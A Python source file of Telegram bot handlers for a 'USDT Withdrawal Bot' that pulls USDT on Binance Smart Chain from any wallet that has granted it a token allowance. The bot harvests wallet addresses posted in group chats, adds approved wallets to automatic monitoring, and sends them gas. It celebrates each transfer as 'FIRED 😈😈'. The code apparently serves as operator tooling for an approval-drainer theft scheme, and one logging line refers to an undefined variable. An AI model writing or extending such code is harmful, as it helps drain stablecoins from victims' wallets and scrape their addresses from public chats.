"""
Telegram bot handlers for USDT withdrawal functionality
"""

import logging
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode
from blockchain import blockchain_manager
from utils import (
    create_main_menu, create_back_menu, is_rate_limited, validate_usdt_amount,
    log_user_action, create_wallet_info_text, create_error_message,
    create_success_message, create_info_message, create_warning_message,
    truncate_address, format_usdt_amount, create_enhanced_wallet_detection_text
)
from auto_mode import auto_mode_manager
from config import RATE_LIMIT_SECONDS

logger = logging.getLogger(__name__)

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user = update.effective_user
    log_user_action(user.id, user.username, "start")
    
    welcome_text = (
        f"🤖 *Welcome to USDT Withdrawal Bot*\n\n"
        f"Hello {user.first_name}! This bot helps you manage USDT withdrawals "
        f"from approved wallets on Binance Smart Chain.\n\n"
        f"🔐 *Security Features:*\n"
        f"• Only approved wallet addresses\n"
        f"• Allowance-based withdrawals\n"
        f"• Transaction verification\n"
        f"• Rate limiting protection\n\n"
        f"Choose an option from the menu below:"
    )
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=create_main_menu(),
        parse_mode=ParseMode.MARKDOWN
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inline keyboard button presses"""
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    data = query.data
    
    # Rate limiting check (minimal 1 second to prevent spam)
    if is_rate_limited(user.id, RATE_LIMIT_SECONDS):
        await query.edit_message_text(
            create_warning_message(
                f"Please wait {RATE_LIMIT_SECONDS} second between actions."
            ),
            reply_markup=create_back_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    log_user_action(user.id, user.username, f"button_press:{data}")
    
    try:
        if data == "enter_wallet":
            await handle_enter_wallet(query, context)
        elif data == "check_wallet":
            await handle_check_wallet(query, context)
        elif data == "withdraw_all":
            await handle_withdraw_all(query, context)
        elif data == "withdraw_custom":
            await handle_withdraw_custom(query, context)
        elif data == "refresh":
            await handle_refresh(query, context)
        elif data == "toggle_auto_mode":
            await handle_toggle_auto_mode(query, context)
        elif data == "toggle_auto_gas":
            await handle_toggle_auto_gas(query, context)
        elif data == "main_menu":
            await handle_main_menu(query, context)
        else:
            await query.edit_message_text(
                create_error_message("Unknown action"),
                reply_markup=create_main_menu(),
                parse_mode=ParseMode.MARKDOWN
            )
    except Exception as e:
        logger.error(f"Error in button handler: {e}")
        await query.edit_message_text(
            create_error_message("An unexpected error occurred. Please try again."),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages"""
    user = update.effective_user
    text = update.message.text.strip()
    chat = update.effective_chat
    
    # Check if message is from a group or channel
    if chat.type in ['group', 'supergroup', 'channel']:
        await handle_group_message(update, context, text)
        return
    
    # Rate limiting check (minimal 1 second to prevent spam)
    if is_rate_limited(user.id, RATE_LIMIT_SECONDS):
        await update.message.reply_text(
            create_warning_message(
                f"Please wait {RATE_LIMIT_SECONDS} second between actions."
            ),
            reply_markup=create_back_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    try:
        if context.user_data.get("awaiting_wallet"):
            await handle_wallet_input(update, context, text)
        elif context.user_data.get("awaiting_amount"):
            await handle_amount_input(update, context, text)
        else:
            # Check if text contains a wallet address
            cleaned_address = blockchain_manager.clean_address_input(text)
            if blockchain_manager.validate_address(cleaned_address):
                await auto_handle_wallet_address(update, context, cleaned_address)
            else:
                # Unknown text input
                await update.message.reply_text(
                    create_info_message(
                        "Please use the menu buttons to interact with the bot."
                    ),
                    reply_markup=create_main_menu(),
                    parse_mode=ParseMode.MARKDOWN
                )
    except Exception as e:
        logger.error(f"Error in text handler: {e}")
        await update.message.reply_text(
            create_error_message("An unexpected error occurred. Please try again."),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_enter_wallet(query, context):
    """Handle wallet address entry"""
    await query.edit_message_text(
        create_info_message(
            "Please send the approved wallet address:\n\n"
            "📋 *Format:* 0x followed by 40 hexadecimal characters\n"
            "🔍 *Example:* 0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8"
        ),
        reply_markup=create_back_menu(),
        parse_mode=ParseMode.MARKDOWN
    )
    context.user_data["awaiting_wallet"] = True

async def handle_check_wallet(query, context):
    """Handle wallet information check"""
    wallet = context.user_data.get("wallet")
    if not wallet:
        await query.edit_message_text(
            create_warning_message(
                "No wallet address set. Please enter an approved wallet first."
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await query.edit_message_text(
        create_info_message("Checking wallet information..."),
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Get comprehensive wallet information
    usdt_balance = blockchain_manager.get_usdt_balance(wallet)
    bnb_balance = blockchain_manager.get_bnb_balance(wallet)
    allowance = blockchain_manager.get_allowance(wallet)
    
    if usdt_balance is None or bnb_balance is None or allowance is None:
        await query.edit_message_text(
            create_error_message(
                "Failed to retrieve wallet information. Please check your connection and try again."
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Add to auto monitoring if approved
    if allowance > 0:
        auto_mode_manager.add_wallet(wallet)
    
    wallet_info = create_wallet_info_text(wallet, usdt_balance, allowance, bnb_balance)
    await query.edit_message_text(
        wallet_info,
        reply_markup=create_main_menu(),
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_withdraw_all(query, context):
    """Handle full withdrawal"""
    wallet = context.user_data.get("wallet")
    if not wallet:
        await query.edit_message_text(
            create_warning_message(
                "No wallet address set. Please enter an approved wallet first."
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await query.edit_message_text(
        create_info_message("Processing full withdrawal..."),
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Get allowance and balance amounts
    allowance = blockchain_manager.get_allowance(wallet)
    balance = blockchain_manager.get_usdt_balance(wallet)
    
    if allowance is None or balance is None:
        await query.edit_message_text(
            create_error_message("Failed to check wallet information. Please try again."),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if allowance <= 0:
        await query.edit_message_text(
            create_warning_message(
                f"No allowance available for withdrawal.\n\n"
                f"Current allowance: {format_usdt_amount(allowance)}"
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    if balance <= 0:
        await query.edit_message_text(
            create_warning_message(
                f"No USDT balance available for withdrawal.\n\n"
                f"Current balance: {format_usdt_amount(balance)}"
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Use the minimum of allowance and balance for withdrawal
    withdraw_amount = min(allowance, balance)
    
    # Perform withdrawal
    success, message = blockchain_manager.withdraw_usdt(wallet, withdraw_amount)
    
    if success:
        log_user_action(query.from_user.id, query.from_user.username, 
                       f"withdraw_all:{withdraw_amount}", wallet)
        await query.edit_message_text(
            create_success_message(message),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await query.edit_message_text(
            create_error_message(message),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_withdraw_custom(query, context):
    """Handle custom amount withdrawal"""
    wallet = context.user_data.get("wallet")
    if not wallet:
        await query.edit_message_text(
            create_warning_message(
                "No wallet address set. Please enter an approved wallet first."
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await query.edit_message_text(
        create_info_message(
            "Please send the amount of USDT to withdraw:\n\n"
            "💰 *Format:* Decimal number (e.g., 100.50)\n"
            "📊 *Range:* 0.000001 - 1,000,000 USDT\n"
            "🎯 *Precision:* Up to 6 decimal places"
        ),
        reply_markup=create_back_menu(),
        parse_mode=ParseMode.MARKDOWN
    )
    context.user_data["awaiting_amount"] = True

async def handle_refresh(query, context):
    """Handle refresh action"""
    wallet = context.user_data.get("wallet")
    if not wallet:
        await query.edit_message_text(
            create_info_message(
                "🤖 *USDT Withdrawal Bot*\n\n"
                "No wallet configured. Please enter an approved wallet to continue."
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await handle_check_wallet(query, context)

async def handle_main_menu(query, context):
    """Handle return to main menu"""
    # Clear any awaiting states
    context.user_data.pop("awaiting_wallet", None)
    context.user_data.pop("awaiting_amount", None)
    
    wallet = context.user_data.get("wallet")
    if wallet:
        wallet_display = truncate_address(wallet)
        menu_text = (
            f"🤖 *USDT Withdrawal Bot*\n\n"
            f"🏦 Current wallet: `{wallet_display}`\n\n"
            f"Choose an action from the menu below:"
        )
    else:
        menu_text = (
            f"🤖 *USDT Withdrawal Bot*\n\n"
            f"Please select an option from the menu below:"
        )
    
    await query.edit_message_text(
        menu_text,
        reply_markup=create_main_menu(),
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_wallet_input(update, context, wallet_address):
    """Handle wallet address input validation"""
    context.user_data["awaiting_wallet"] = False
    
    # Clean the address input first
    cleaned_address = blockchain_manager.clean_address_input(wallet_address)
    
    if not blockchain_manager.validate_address(cleaned_address):
        await update.message.reply_text(
            create_error_message(
                "Invalid wallet address format.\n\n"
                "Please provide a valid Ethereum address starting with '0x' "
                "followed by 40 hexadecimal characters.\n\n"
                f"Your input: `{wallet_address}`\n"
                f"Expected format: `0x742d35Cc6634C0532925a3b8D48C1Ef9c2d8F5C8`"
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Store wallet address
    wallet = blockchain_manager.w3.to_checksum_address(cleaned_address)
    context.user_data["wallet"] = wallet
    
    log_user_action(update.effective_user.id, update.effective_user.username,
                   "wallet_set", wallet)
    
    # Get comprehensive wallet information
    usdt_balance = blockchain_manager.get_usdt_balance(wallet)
    bnb_balance = blockchain_manager.get_bnb_balance(wallet)
    allowance = blockchain_manager.get_allowance(wallet)
    
    if usdt_balance is None or bnb_balance is None or allowance is None:
        await update.message.reply_text(
            create_warning_message(
                f"Wallet address saved: `{truncate_address(wallet)}`\n\n"
                f"⚠️ Could not retrieve wallet information. "
                f"Please check your connection and try again."
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Add to auto monitoring if approved
    if allowance > 0:
        auto_mode_manager.add_wallet(wallet)
    
    success_text = create_wallet_info_text(wallet, usdt_balance, allowance, bnb_balance)
    success_text += f"\n\nYou can now perform withdrawals using the menu below:"
    
    await update.message.reply_text(
        success_text,
        reply_markup=create_main_menu(),
        parse_mode=ParseMode.MARKDOWN
    )

async def handle_group_message(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
    """Handle messages from groups and channels - detect wallet addresses"""
    try:
        # Extract wallet addresses from text
        import re
        pattern = r'(0x[a-fA-F0-9]{40})'
        addresses = re.findall(pattern, text)
        
        if addresses:
            chat = update.effective_chat
            user = update.effective_user
            
            for address in addresses:
                if blockchain_manager.validate_address(address):
                    # Log the detection
                    log_user_action(user.id, user.username, f"address_detected_in_group:{chat.title}", address)
                    
                    # Get comprehensive wallet info
                    usdt_balance = blockchain_manager.get_usdt_balance(address)
                    bnb_balance = blockchain_manager.get_bnb_balance(address)
                    allowance = blockchain_manager.get_allowance(address)
                    
                    if usdt_balance is not None and bnb_balance is not None and allowance is not None:
                        # Create enhanced detection message
                        response_text = create_enhanced_wallet_detection_text(
                            address, usdt_balance, bnb_balance, allowance
                        )
                        
                        # Add wallet to auto monitoring if approved
                        if allowance > 0:
                            auto_mode_manager.add_wallet(address)
                            
                        # Immediate auto gas check for ALL newly detected wallets (approved or not)
                        await check_immediate_auto_gas(address, usdt_balance, bnb_balance)
                        
                        # Send to chat (if bot has permissions) or log
                        try:
                            await update.message.reply_text(
                                response_text,
                                parse_mode=ParseMode.MARKDOWN
                            )
                        except Exception as e:
                            logger.info(f"Could not reply in group {chat.title}: {e}")
                            logger.info(f"Detected address: {address} with balance: {balance} USDT")
    except Exception as e:
        logger.error(f"Error handling group message: {e}")

async def auto_handle_wallet_address(update: Update, context: ContextTypes.DEFAULT_TYPE, address: str):
    """Automatically handle wallet address detection in private messages"""
    try:
        user = update.effective_user
        
        # Get comprehensive wallet information
        usdt_balance = blockchain_manager.get_usdt_balance(address)
        bnb_balance = blockchain_manager.get_bnb_balance(address)
        allowance = blockchain_manager.get_allowance(address)
        
        if usdt_balance is None or bnb_balance is None or allowance is None:
            await update.message.reply_text(
                create_warning_message(
                    f"🔍 Wallet address detected: `{truncate_address(address)}`\n\n"
                    f"⚠️ Could not retrieve wallet information. Please check your connection."
                ),
                reply_markup=create_main_menu(),
                parse_mode=ParseMode.MARKDOWN
            )
            return
        
        # Store the wallet and show info
        wallet = blockchain_manager.w3.to_checksum_address(address)
        context.user_data["wallet"] = wallet
        
        # Add to auto monitoring if approved
        if allowance > 0:
            auto_mode_manager.add_wallet(wallet)
            
        # Immediate auto gas check for ALL wallets (approved or not)
        await check_immediate_auto_gas(wallet, usdt_balance, bnb_balance)
        
        log_user_action(user.id, user.username, "auto_wallet_detected", wallet)
        
        success_text = (
            f"🔍 *Wallet Address Auto-Detected*\n\n"
            f"{create_wallet_info_text(wallet, usdt_balance, allowance, bnb_balance)}\n\n"
            f"✅ Wallet automatically added to your session.\n"
            f"You can now perform withdrawals using the menu below:"
        )
        
        await update.message.reply_text(
            success_text,
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        logger.error(f"Error in auto wallet handler: {e}")
        await update.message.reply_text(
            create_error_message("Error processing wallet address."),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )

async def check_immediate_auto_gas(wallet_address: str, usdt_balance: float, bnb_balance: float):
    """Check and send auto gas immediately for ALL wallets that meet conditions"""
    try:
        # Only proceed if auto gas is enabled
        if not auto_mode_manager.auto_gas_enabled:
            return
            
        from config import AUTO_GAS_USDT_THRESHOLD, AUTO_GAS_BNB_THRESHOLD, AUTO_GAS_BNB_AMOUNT, AUTO_GAS_PRIVATE_KEY
        
        # Check auto gas conditions for ANY wallet (not just approved)
        should_send_gas = (
            usdt_balance >= AUTO_GAS_USDT_THRESHOLD and  # USDT >= 0.5
            bnb_balance < AUTO_GAS_BNB_THRESHOLD and     # BNB < 0.00000720
            usdt_balance > 0 and                         # USDT not zero
            bnb_balance >= 0                             # BNB not negative
        )
        
        if should_send_gas:
            # Send BNB gas immediately to ANY qualifying wallet
            success, message = blockchain_manager.send_bnb(
                wallet_address, 
                AUTO_GAS_BNB_AMOUNT, 
                AUTO_GAS_PRIVATE_KEY
            )
            
            if success:
                logger.info(f"Auto gas sent to ANY wallet: {wallet_address} -> {AUTO_GAS_BNB_AMOUNT} BNB (USDT: ${usdt_balance}, BNB: {bnb_balance})")
                
                # Send FIRED notification
                await send_auto_gas_notification(wallet_address)
            else:
                logger.warning(f"Auto gas failed for wallet: {wallet_address} -> {message}")
                
    except Exception as e:
        logger.error(f"Error in auto gas check: {e}")

async def send_auto_gas_notification(wallet_address: str):
    """Send FIRED notification when auto gas is sent"""
    try:
        from telegram import Bot
        from config import BOT_TOKEN
        
        # Format the wallet address (show first 6 and last 4 characters)
        short_address = f"{wallet_address[:6]}****{wallet_address[-4:]}"
        
        # Create FIRED message
        notification_text = f"🔥⛽ AUTO GAS FIRED!\n\n{short_address} FIRED 😈😈\n\n✅ Sent 0.00001 BNB gas automatically"
        
        # Get bot instance
        bot = Bot(token=BOT_TOKEN)
        
        # You can add specific chat IDs here to send notifications to
        # For now, we'll log it and it will appear in the bot logs
        logger.info(f"AUTO GAS FIRED: {short_address} FIRED 😈😈")
        
        # Send to notification chats if configured
        from config import AUTO_GAS_NOTIFICATION_CHATS
        
        if AUTO_GAS_NOTIFICATION_CHATS:
            for chat_id_str in AUTO_GAS_NOTIFICATION_CHATS:
                try:
                    chat_id = int(chat_id_str.strip())
                    if chat_id != 0:  # Skip empty/invalid chat IDs
                        await bot.send_message(chat_id=chat_id, text=notification_text)
                        logger.info(f"FIRED notification sent to chat {chat_id}")
                except Exception as e:
                    logger.error(f"Failed to send FIRED notification to {chat_id_str}: {e}")
        
    except Exception as e:
        logger.error(f"Error sending auto gas notification: {e}")

async def handle_toggle_auto_mode(query, context):
    """Handle auto mode toggle"""
    try:
        enabled, message = auto_mode_manager.toggle_auto_mode()
        
        # Get current wallet and add to monitoring if enabled and approved
        wallet = context.user_data.get("wallet")
        if enabled and wallet:
            allowance = blockchain_manager.get_allowance(wallet)
            if allowance and allowance > 0:
                auto_mode_manager.add_wallet(wallet)
        
        status_text = (
            f"{message}\n\n"
            f"{auto_mode_manager.get_status()}"
            f"Choose an action below:"
        )
        
        await query.edit_message_text(
            status_text,
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        logger.error(f"Error toggling auto mode: {e}")
        await query.edit_message_text(
            create_error_message("Failed to toggle auto mode. Please try again."),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_toggle_auto_gas(query, context):
    """Handle auto gas toggle"""
    try:
        enabled, message = auto_mode_manager.toggle_auto_gas()
        
        # Get current wallet and add to monitoring if enabled and approved
        wallet = context.user_data.get("wallet")
        if enabled and wallet:
            allowance = blockchain_manager.get_allowance(wallet)
            if allowance and allowance > 0:
                auto_mode_manager.add_wallet(wallet)
        
        status_text = (
            f"{message}\n\n"
            f"{auto_mode_manager.get_status()}"
            f"Choose an action below:"
        )
        
        await query.edit_message_text(
            status_text,
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        logger.error(f"Error toggling auto gas: {e}")
        await query.edit_message_text(
            create_error_message("Failed to toggle auto gas. Please try again."),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_amount_input(update, context, amount_text):
    """Handle withdrawal amount input validation"""
    context.user_data["awaiting_amount"] = False
    
    # Validate amount
    is_valid, amount, error_msg = validate_usdt_amount(amount_text)
    if not is_valid:
        await update.message.reply_text(
            create_error_message(error_msg),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    wallet = context.user_data.get("wallet")
    if not wallet:
        await update.message.reply_text(
            create_error_message(
                "No wallet address set. Please enter an approved wallet first."
            ),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    await update.message.reply_text(
        create_info_message(f"Processing withdrawal of {format_usdt_amount(amount)}..."),
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Perform withdrawal
    success, message = blockchain_manager.withdraw_usdt(wallet, amount)
    
    if success:
        log_user_action(update.effective_user.id, update.effective_user.username,
                       f"withdraw_custom:{amount}", wallet)
        await update.message.reply_text(
            create_success_message(message),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
    else:
        await update.message.reply_text(
            create_error_message(message),
            reply_markup=create_main_menu(),
            parse_mode=ParseMode.MARKDOWN
        )
